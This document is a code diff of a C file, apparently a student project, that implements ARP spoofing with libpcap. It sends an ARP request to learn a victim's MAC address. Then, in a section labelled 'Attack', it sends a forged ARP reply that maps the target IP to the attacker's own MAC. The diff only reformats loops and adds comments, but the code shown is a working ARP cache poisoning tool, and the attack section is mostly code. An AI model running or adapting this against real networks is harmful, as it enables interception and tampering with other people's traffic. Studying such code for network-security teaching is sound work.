@@ -2,8 +2,6 @@
 #include <arpa/inet.h>
 #include "send_arp.h"
 
-
-
 int send_arp(char *interface, char *sender_ip, char *target_ip){
     char packet[45];
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -30,8 +28,10 @@ int send_arp(char *interface, char *sender_ip, char *target_ip){
     struct ethernet_header *e_header;
     e_header = (struct ethernet_header *)packet;
 
-    for(int i = 0; i < MAC_SIZE; i++) e_header->dst_mac[i] = eth_dst_mac[i];
-    for(int i = 0; i < MAC_SIZE; i++) e_header->src_mac[i] = eth_src_mac[i];
+    for(int i = 0; i < MAC_SIZE; i++)
+        e_header->dst_mac[i] = eth_dst_mac[i];
+    for(int i = 0; i < MAC_SIZE; i++)
+        e_header->src_mac[i] = eth_src_mac[i];
     e_header->type = ntohs(ARPTYPE);
     struct arp_header *arp;
     arp = (struct arp_header *)(packet+ETH_LENGTH);
@@ -41,9 +41,11 @@ int send_arp(char *interface, char *sender_ip, char *target_ip){
     arp->hardware_size = ARP_HWSIZE;
     arp->protocol_size = ARP_PROTOCOLSIZE;
     arp->opcode = ntohs(ARP_REQ);
-    for(int i=0; i<MAC_SIZE; i++) arp->sender_mac[i] = eth_src_mac[i];
+    for(int i=0; i<MAC_SIZE; i++)
+        arp->sender_mac[i] = eth_src_mac[i];
     arp->sender_ip = inet_addr(local_ip);
-    for(int i=0; i<MAC_SIZE; i++) arp->target_mac[i] = 0;
+    for(int i=0; i<MAC_SIZE; i++)
+        arp->target_mac[i] = 0;
     arp->target_ip = inet_addr(sender_ip);
 
     if(pcap_sendpacket(handle, packet, PACKET_SIZE) != 0)
@@ -60,10 +62,12 @@ int send_arp(char *interface, char *sender_ip, char *target_ip){
     }
 
     //***Attack*********************************
-
+    //
     e_header = (struct ethernet_header *)packet;
-    for(int i = 0; i < 6; i++) e_header->dst_mac[i] = eth_dst_mac[i]; // sender_mac
-    for(int i = 0; i < 6; i++) e_header->src_mac[i] = eth_src_mac[i]; // my mac
+    for(int i = 0; i < MAC_SIZE; i++)
+        e_header->dst_mac[i] = eth_dst_mac[i]; // sender_mac
+    for(int i = 0; i < MAC_SIZE; i++)
+        e_header->src_mac[i] = eth_src_mac[i]; // my mac
     e_header->type = ntohs(ARPTYPE);
     arp = (struct arp_header *)(packet+ETH_LENGTH);
 
@@ -72,9 +76,11 @@ int send_arp(char *interface, char *sender_ip, char *target_ip){
     arp->hardware_size = ARP_HWSIZE;
     arp->protocol_size = ARP_PROTOCOLSIZE;
     arp->opcode = ntohs(ARP_REP);
-    for(int i=0; i<MAC_SIZE; i++) arp->sender_mac[i] = eth_src_mac[i];
+    for(int i=0; i<MAC_SIZE; i++)
+        arp->sender_mac[i] = eth_src_mac[i];
     arp->sender_ip = inet_addr(target_ip);
-    for(int i=0; i<MAC_SIZE; i++) arp->target_mac[i] = eth_dst_mac[i];
+    for(int i=0; i<MAC_SIZE; i++)
+        arp->target_mac[i] = eth_dst_mac[i];
     arp->target_ip = inet_addr(sender_ip);
     printf("Attack Start\n");
     if(pcap_sendpacket(handle, packet, PACKET_SIZE) != 0)
@@ -87,23 +93,24 @@ int send_arp(char *interface, char *sender_ip, char *target_ip){
 int check_arp_reply(const unsigned char *packet, uint8_t eth_dst_mac[6], uint8_t eth_my_mac[6], char *sender_ip){
     struct ethernet_header *e_header;
     e_header = (struct e_header*)packet;
-    //ethernet type check
+    //Check Eth type
     if (!(htons(e_header->type) == ARPTYPE))
         return -1;
     struct arp_header *arp_header;
     arp_header = (struct arp_header*)(packet+ETH_LENGTH);
-    //ARP reply check
+    //Check ARP Reply
     if (!(htons(arp_header->opcode) == ARP_REP))
         return -1;
-    //MAC Check
+    //Check MAC Address
     for(int i=0; i<MAC_SIZE; i++){
         if(eth_my_mac[i] != e_header->dst_mac[i])
             return -1;
     }
-
+    //Check MY IP
     if(arp_header->sender_ip !=inet_addr(sender_ip))
         return -1;
 
+    //Print Sender MAC
     printf("Sender MAC : ");
     for(int i=0; i<MAC_SIZE; i++){
         eth_dst_mac[i] = arp_header->sender_mac[i];
@@ -113,6 +120,7 @@ int check_arp_reply(const unsigned char *packet, uint8_t eth_dst_mac[6], uint8_t
     return 0;
 }
 
+// get MAC Address Function
 void get_mac(uint8_t MAC_addr[6], char *interface)
 {
     int s;
@@ -123,6 +131,7 @@ void get_mac(uint8_t MAC_addr[6], char *interface)
     memcpy(MAC_addr, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
 }
 
+//get My IP Address Function
 char *get_host_ip(char *interface){
     int s;
     struct ifreq ifr;
